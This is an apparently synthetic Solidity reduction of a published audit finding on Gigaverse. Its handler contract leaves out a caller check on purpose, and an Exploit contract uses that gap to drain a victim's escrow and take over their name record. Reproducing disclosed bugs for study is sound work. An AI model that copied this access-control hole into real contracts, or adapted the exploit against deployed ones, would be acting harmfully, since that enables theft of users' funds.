// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Gigaverse — unauthorized GigaNameNFTBeforeUpdateHandler.update
    (Pashov Audit Group, Gigaverse 2025-01-18, H-02).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    The blamed update() signature is the one in the report. The body is the
    account-record rewrite the report describes (clear the previous owner,
    write the new owner) with no caller check. M-04 quotes that same rewrite.

    Root cause: update() is external and does not require msg.sender to be
    GigaNameNFT. Anyone can point an existing name at themselves and take the
    escrow that sits on that account row. */

interface IERC721UpdateHandler {
    function update(address tokenContract, address to, uint256 tokenId, address auth) external;
}

contract EscrowToken {
    string public name = "ACCT";
    string public symbol = "ACCT";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract NameNFT {
    mapping(uint256 => address) public ownerOfToken;
    mapping(uint256 => bool) public existsFlag;

    function exists(uint256 tokenId) external view returns (bool) {
        return existsFlag[tokenId];
    }

    function ownerOf(uint256 tokenId) external view returns (address) {
        return ownerOfToken[tokenId];
    }

    function mint(address to, uint256 tokenId) external {
        existsFlag[tokenId] = true;
        ownerOfToken[tokenId] = to;
    }
}

contract AccountSystem {
    EscrowToken public token;
    address public handler;
    mapping(address => uint256) public usernameId;
    mapping(address => uint256) public escrow;
    uint256 public pending;

    constructor(EscrowToken _token) {
        token = _token;
    }

    function setHandler(address _handler) external {
        require(handler == address(0), "handler set");
        handler = _handler;
    }

    function getPlayerUsernameId(address player) external view returns (uint256) {
        return usernameId[player];
    }

    function seed(address player, uint256 tokenId, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        usernameId[player] = tokenId;
        escrow[player] = amount;
    }

    function removeUsername(address player) external {
        require(msg.sender == handler, "not handler");
        uint256 bal = escrow[player];
        escrow[player] = 0;
        usernameId[player] = 0;
        pending += bal;
    }

    function setUsername(address to, uint256 tokenId) external {
        require(msg.sender == handler, "not handler");
        usernameId[to] = tokenId;
        uint256 bal = pending;
        pending = 0;
        escrow[to] += bal;
    }

    function withdraw() external returns (uint256 bal) {
        bal = escrow[msg.sender];
        escrow[msg.sender] = 0;
        token.transfer(msg.sender, bal);
    }
}

contract GigaNameNFTBeforeUpdateHandler is IERC721UpdateHandler {
    AccountSystem public accountSystem;
    NameNFT public boundNft;

    constructor(AccountSystem _account, NameNFT _nft) {
        accountSystem = _account;
        boundNft = _nft;
    }

    function update(
        address tokenContract,
        address to,
        uint256 tokenId,
        address //auth
    ) external override {
        NameNFT gigaNameNFT = NameNFT(tokenContract);
        if (gigaNameNFT.exists(tokenId)) {
            address prevOwner = gigaNameNFT.ownerOf(tokenId);
            if (prevOwner != address(0) && accountSystem.getPlayerUsernameId(prevOwner) == tokenId) {
                // @> VULN: update() does not require msg.sender == GigaNameNFT, so this clears the real owner's escrow.
                accountSystem.removeUsername(prevOwner);
            }
        }
        if (accountSystem.getPlayerUsernameId(to) == 0) {
            accountSystem.setUsername(to, tokenId);
        }
    }
}

contract Exploit {
    address public constant VICTIM = address(0xBEEF);
    uint256 public constant TOKEN_ID = 7;
    uint256 public constant N = 100 ether;

    EscrowToken public token; // nonce 1
    NameNFT public nft; // nonce 2
    AccountSystem public account; // nonce 3
    GigaNameNFTBeforeUpdateHandler public handler; // nonce 4

    uint256 public victimBefore;
    uint256 public victimAfter;
    uint256 public taken;

    constructor() {
        token = new EscrowToken();
        nft = new NameNFT();
        account = new AccountSystem(token);
        handler = new GigaNameNFTBeforeUpdateHandler(account, nft);
        account.setHandler(address(handler));
    }

    function run() external {
        nft.mint(VICTIM, TOKEN_ID);
        token.mint(address(this), N);
        token.approve(address(account), N);
        account.seed(VICTIM, TOKEN_ID, N);
        victimBefore = account.escrow(VICTIM);
        handler.update(address(nft), address(this), TOKEN_ID, address(0));
        victimAfter = account.escrow(VICTIM);
        taken = account.withdraw();
        require(victimBefore == N, "victim did not start with 100");
        require(victimAfter == 0, "victim escrow was not cleared");
        require(taken == N, "attacker did not take 100");
        require(token.balanceOf(address(this)) == N, "100 not withdrawn");
        require(account.usernameId(address(this)) == TOKEN_ID, "name not stolen");
        require(account.usernameId(VICTIM) == 0, "victim still linked");
    }
}
